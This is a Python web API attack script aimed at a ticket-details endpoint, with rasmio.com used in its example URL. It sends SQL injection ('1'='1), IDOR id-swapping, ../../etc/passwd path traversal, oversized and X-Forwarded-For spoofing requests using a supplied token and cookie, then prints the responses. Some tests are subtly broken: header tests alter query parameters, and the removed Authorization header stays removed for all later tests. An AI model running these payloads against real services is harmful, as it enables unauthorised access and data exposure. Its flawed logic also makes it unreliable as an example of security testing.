#!/usr/bin/env python3

import os
import sys
import requests
import urllib.parse
from typing import Dict, Callable

# Ensure the full URL is provided as an argument
def parse_args() -> str:
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <full_url>")
        print("Example: python3 script.py https://rasmio.com/api/v3/Ticket/TicketDetails?id=18838")
        sys.exit(1)
    return sys.argv[1]

# Get environment variables and validate
def get_env_variables() -> Dict[str, str]:
    token = os.getenv('TOKEN')
    cookie = os.getenv('COOKIE')
    if not token or not cookie:
        print("Error: TOKEN and COOKIE environment variables must be set.")
        sys.exit(1)
    return {"TOKEN": token, "COOKIE": cookie}

# Parse URL to extract base URL and query parameters
def parse_url(full_url: str) -> Dict[str, str]:
    parsed_url = urllib.parse.urlparse(full_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = urllib.parse.parse_qs(parsed_url.query)
    return {"BASE_URL": base_url, "PARAMS": params}

def get_test_cases() -> list:
    return [
        ("Testing Normal", lambda p: p),  # No changes
        ("Testing Parameter Tampering", lambda p: {key: '100' for key in p}),  # Tamper all params
        ("Testing SQL Injection", lambda p: {key: f"{value[0]}' OR '1'='1" for key, value in p.items()}),  # SQL Injection
        ("Testing Broken Authentication", lambda p: None),  # No parameter modification, remove Authorization header from headers
        ("Testing Excessive Data Exposure", lambda p: p),  # No changes, just data exposure check
        ("Testing IDOR", lambda p: {key: f"18800" if 'id' in key else value[0] for key, value in p.items()}),  # IDOR test
        ("Testing Token Replay Attack", lambda p: p),  # Token replay (no param modification)
        ("Testing Cookie Manipulation", lambda p: {key: f"persist%3ArasmioToken={{\"accessToken\":\"invalid\"}}" if key == 'Cookie' else value[0] for key, value in p.items()}),  # Cookie manipulation
        ("Testing Path Traversal", lambda p: {key: f"../../etc/passwd" if 'id' in key else value[0] for key, value in p.items()}),  # Path Traversal
        ("Testing with a Large Payload", lambda p: {key: urllib.parse.quote("A" * 10000) if 'id' in key else value[0] for key, value in p.items()}),  # Large payload test
        ("Testing Header Manipulation", lambda p: {**p, "X-Forwarded-For": "127.0.0.1"})  # Adding custom header
    ]

# Function to perform the test
def perform_test(base_url: str, test_name: str, modify_params_func: Callable, params: Dict[str, str], headers: Dict[str, str]) -> None:
    # Modify the params for the current test
    modified_params = modify_params_func(params) if modify_params_func else {}

    # For "Testing Broken Authentication", we remove the Authorization header
    if test_name == "Testing Broken Authentication":
        headers.pop("Authorization", None)  # Safely remove Authorization header

    # Construct the full URL with the modified parameters
    url = f"{base_url}?{urllib.parse.urlencode(modified_params, doseq=True)}" if modified_params else base_url

    # Send GET request
    response = requests.get(url, headers=headers)

    # Output result for this test
    print(f"\n### {test_name} ###")
    print(f"Full URL: {url}")
    print(f"Request Params: {modified_params}")
    print(f"Request Headers: {headers}")
    print(f"Response Status: {response.status_code}")
    print(f"Response Body: {response.text[:200]}...")  # Limit to first 200 chars for readability


# Main function to coordinate everything
def main():
    # Parse command line arguments, environment variables, and URL
    full_url = parse_args()
    env_vars = get_env_variables()
    url_info = parse_url(full_url)

    base_url = url_info["BASE_URL"]
    params = url_info["PARAMS"]
    
    # Set up the request headers with TOKEN and COOKIE
    headers = {
        "Authorization": f"Bearer {env_vars['TOKEN']}",
        "Cookie": env_vars['COOKIE']
    }
    
    # Iterate over test cases and perform each one
    test_cases = get_test_cases()
    for test_name, modify_params_func in test_cases:
        perform_test(base_url, test_name, modify_params_func, params, headers)

# Run the main function when the script is executed
if __name__ == "__main__":
    main()
